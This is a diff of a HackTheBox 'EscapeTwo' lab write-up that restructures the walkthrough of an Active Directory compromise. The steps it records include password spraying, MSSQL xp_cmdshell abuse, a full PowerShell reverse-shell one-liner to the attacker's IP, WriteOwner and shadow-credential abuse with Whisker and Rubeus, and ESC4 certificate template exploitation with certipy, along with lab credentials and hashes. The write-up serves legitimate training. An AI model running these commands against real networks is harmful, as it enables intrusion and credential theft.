@@ -9,17 +9,39 @@ services: ['ncacn_http', 'microsoft-ds', 'kpasswd5', 'domain', 'http', 'kerberos
 techniques_used: []
 tools_used: [nmap]
 ---
-
 # EscapeTwo
 
 **Platform:** HTB | **Difficulty:** Easy | **OS:** Windows | **Date:** 15/06/2025
 
-## Overview 
+## Overview
 
+Complete domain compromise through credential discovery, password reuse, and certificate template abuse via WriteOwner permissions.
+
+```mermaid
+flowchart TD
+    A[SMB Share Enumeration] --> B[Credential Discovery<br/>Excel Files]
+    B --> C[Password Spraying] 
+    C --> D[SQL Server Access<br/>sa Account]
+    D --> E[Additional Credential Discovery<br/>Config Files]
+    E --> F[WinRM Access<br/>ryan Account]
+    F --> G[WriteOwner Abuse<br/>ca_svc Takeover]
+    G --> H[Certificate Template<br/>ESC4 Exploitation]
+    H --> I[Administrator Access]
+    
+    classDef recon fill:#e3f2fd,stroke:#1976d2
+    classDef exploit fill:#e8f5e8,stroke:#2e7d32
+    classDef privesc fill:#fff3e0,stroke:#f57c00
+    classDef goal fill:#ffebee,stroke:#c62828
+    
+    class A,B recon
+    class C,D,E,F exploit
+    class G,H privesc
+    class I goal
+```
 
 ---
 
-## Phase 1: Reconnaissance 
+## Phase 1: Reconnaissance
 
 ### Network Discovery
 
@@ -42,7 +64,11 @@ nmap -sC -sV -T4 10.10.11.51 -oA nmap/escapetwo
 | 3268 | ldap         | Microsoft Windows Active Directory LDAP      |
 | 3269 | ldap         | Microsoft Windows Active Directory LDAP      |
 | 5985 | http         | Microsoft HTTPAPI httpd 2.0                  |
-hosts
+
+Domain controller environment with SQL Server integration, indicating potential for database-related credential discovery.
+
+### DNS Configuration
+
 ```bash
 nxc smb '10.10.11.51' --generate-hosts-file files/hosts && sudo tee -a /etc/hosts < files/hosts
 
@@ -50,13 +76,18 @@ nxc smb '10.10.11.51' --generate-hosts-file files/hosts && sudo tee -a /etc/host
 10.10.11.51     DC01.sequel.htb DC01
 ```
 
+### Initial Access Credentials
+
 Save the assumed breach credentials to files
 ```bash
 echo 'rose' > users.txt
 echo 'KxEPkKe6R8su' > creds.txt
 ```
 
-Use the credentials to enumerate the shares.
+### Share Enumeration
+
+Authenticated SMB enumeration revealed accessible file shares:
+
 ```bash
 nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --shares 
 
@@ -71,7 +102,10 @@ SMB         10.10.11.51     445    DC01             SYSVOL          READ        
 SMB         10.10.11.51     445    DC01             Users           READ  
 ```
 
-And the users
+### User Discovery
+
+LDAP enumeration built comprehensive user list for password spraying:
+
 ```bash
 nxc ldap 'DC01' -u 'rose' -p creds.txt -d 'sequel.htb' --users | awk '{print $5}' | grep -vE '[\[|^-]' > users.txt
 
@@ -86,22 +120,25 @@ rose
 ca_svc
 ```
 
-Spider the files on the smb server
+### File System Analysis
+
+SMB share spidering revealed organizational documents containing credentials:
+
 ```bash
 nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' -M spider_plus -o DOWNLOAD_FLAG=True
 ```
-
 
 ```bash
 cp -r /home/wither/.nxc/modules/nxc_spider_plus/10.10.11.51 .
 ```
 
+### Credential Extraction from Excel Files
 
-Unzip the `accounts.xlsx` file to reveal a list of passwords in `xl/sharedStrings.xml`.
+Excel file analysis revealed embedded passwords in XML structure:
+
 ```bash
 ls
 accounting_2024.xlsx  accounts.xlsx
-
 
 unzip accounts.xlsx       
 Archive:  accounts.xlsx
@@ -127,7 +164,8 @@ Add `sa` to users
 echo 'sa' >> users.txt
 ```
 
-Clean up and save those passwords, adding them to the `creds.txt` list
+Extracted credentials from XML structure and built password list:
+
 ```bash
 grep -oP '<t xml:space="preserve">.*?</t>' sharedstrings.txt | sed -E -n '10p;15p;20p;24p' | sed -E 's/<\/?t[^>]*>//g' >> creds.txt 
 
@@ -164,8 +202,14 @@ kevin
 sa
 ```
 
+---
 
-Use the `users.txt` list and that list of passwords to spray the domain again, to find a valid login for `oscar` and password `86LxLBMgEWaKUnBG`
+## Phase 2: Exploitation - Credential Access & Database Infiltration
+
+### Password Spraying Attack
+
+Password spraying revealed multiple valid accounts including privileged SQL service account:
+
 ```bash
 nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --continue-on-success                                                     
 ...
@@ -175,7 +219,10 @@ SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBM
 ...
 ```
 
-Add `sa` to users 
+### SQL Server Access
+
+`sa` account provided local authentication to SQL Server:
+
 ```bash
 echo 'sa' >> users.txt
 
@@ -185,7 +232,10 @@ nxc mssql 'DC01' -u users.txt  -p creds.txt --local-auth
 MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
 ```
 
-Open a listener
+### Command Execution via SQL
+
+Leveraged SQL Server `xp_cmdshell` functionality for remote code execution:
+
 ```bash
 nc -nvlp 9001
 ```
@@ -195,7 +245,10 @@ Send a Powershell reverse shell using the `sa` account
 nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth -X '$LHOST = "10.10.14.17"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'
 ```
 
-There is another password for a `sql_svc` account `WqSZAF6CysDQbGb3`
+### Additional Credential Discovery
+
+SQL Server configuration files revealed service account credentials:
+
 ```powershell
 pwd
 C:\SQL2019\ExpressAdv_ENU
@@ -206,12 +259,14 @@ SQLSVCACCOUNT="SEQUEL\sql_svc" SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
 ...
 ```
 
-
 ```bash
 echo 'WqSZAF6CysDQbGb3' >> creds.txt
 ```
 
-Spray the passwords list again at the `users.txt` to find that `ryan` reused the `WqSZAF6CysDQbGb3` password, and its valid to login over winrm.
+### Password Reuse Discovery
+
+Extended password spraying revealed credential reuse patterns:
+
 ```bash
 nxc winrm 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --continue-on-success
 
@@ -225,8 +280,14 @@ User flag in ryans desktop
 *Evil-WinRM* PS C:\Users\ryan\Documents> more ../Desktop/user.txt
 ```
 
+---
 
-Upload SharpHound
+## Phase 3: Privilege Escalation - Certificate Authority Abuse
+
+### Domain Analysis
+
+BloodHound data collection to identify privilege escalation paths:
+
 ```powershell
 nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth --put-file SharpHound.exe 'C:\Users\Public\SharpHound.exe'
 
@@ -252,7 +313,10 @@ nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth --get-file 'C:\Users\
 "C:\Users\Public\20250615120137_loot.zip" was downloaded to "loot.zip"
 ```
 
-After uploading and ingesting the data, I found that the `ryan` user has `WriteOwner` permissions over the `ca_svc` service account.
+### WriteOwner Permission Abuse
+
+BloodHound analysis revealed `ryan` possessed `WriteOwner` permissions over `ca_svc`, a certificate services account:
+
 ![[Pasted image 20250615203243.png]]
 
 This account is a member of the "Cert Publishers" group, 
@@ -274,6 +338,9 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] DACL modified successfully!
 ```
 
+### Key Credential Link Manipulation
+
+Ownership of `ca_svc` enabled certificate-based authentication through key credential modification:
 
 ```powershell
 C:\Users\ryan\Documents> .\Whisker.exe add /target:ca_svc
@@ -290,7 +357,7 @@ C:\Users\ryan\Documents> .\Whisker.exe add /target:ca_svc
 [*] You can now run Rubeus with the following syntax:
 
 Rubeus.exe asktgt /user:ca_svc /certificate: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 /password:"3emBDm8wUGJQagmv" /domain:sequel.htb /dc:DC01.sequel.htb /getcredentials /show
-*Evil-WinRM* PS C:\Users\ryan\Documents> .\Rubeus.exe asktgt /user:ca_svc /certificate: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 /password:"3emBDm8wUGJQagmv" /domain:sequel.htb /dc:DC01.sequel.htb /getcredentials /show
+*Evil-WinRM* PS C:\Users\ryan\Documents> .\Rubeus.exe asktgt /user:ca_svc /certificate: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 /password:"3emBDm8wUGJQagmv" /domain:sequel.htb /dc:DC01.sequel.htb /getcredentials /show
 
    ______        _
   (_____ \      | |
@@ -358,6 +425,10 @@ Rubeus.exe asktgt /user:ca_svc /certificate:MIIJwAIBAzCCCXwGCSqGSIb3DQEHAaCCCW0E
       CredentialCount    : 1
        NTLM              : 3B181B914E7A9D5508EA1E20BC2B7FCE
 ```
+
+### Certificate Template Vulnerability (ESC4)
+
+Certificate services enumeration revealed vulnerable template with excessive permissions:
 
 ```bash
 certipy find -dc-ip 10.10.11.51 -username ca_svc@sequel.htb -hashes 3B181B914E7A9D5508EA1E20BC2B7FCE -vulnerable -stdout
@@ -455,6 +526,9 @@ Certificate Templates
       ESC4                              : User has dangerous permissions.
 ```
 
+### Certificate Template Modification
+
+Certificate Publishers group membership enabled modification of certificate template configuration for administrator impersonation:
 
 ```powershell
 certipy template -u 'ca_svc' -hashes 3B181B914E7A9D5508EA1E20BC2B7FCE -template 'DunderMifflinAuthentication' -write-default-configuration -dc-ip 10.10.11.51
@@ -523,36 +597,32 @@ Warning: Remote path completions is disabled due to ruby limitation: undefined m
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\Administrator\Documents> more ..\root.txt
-Cannot find path 'C:\Users\Administrator\root.txt' because it does not exist.
-At line:7 char:9
-+         Get-Content $file | more.com
-+         ~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\root.txt:String) [Get-Content], ItemNotFoundException
-    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
-
-*Evil-WinRM* PS C:\Users\Administrator\Documents> more ..\Desktop\root.txt
+*Evil-WinRM* PS C:\Users\Administrator\Documents> more ../Desktop/root.txt
 60f3d984fddad99abd684db8f92da013
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> 
-
 ```
 
-## Enumeration
-
 ---
 
-## Phase 2: Exploitation
+## Conclusion
 
+Complete domain compromise achieved through credential management failures and certificate services misconfigurations rather than software vulnerabilities.
+
+**Critical Misconfigurations Exploited:**
+- Sensitive credentials stored in accessible file shares
+- Password reuse across multiple service accounts
+- WriteOwner permissions enabling certificate services takeover
+- Certificate template permissions allowing unauthorized enrollment
+
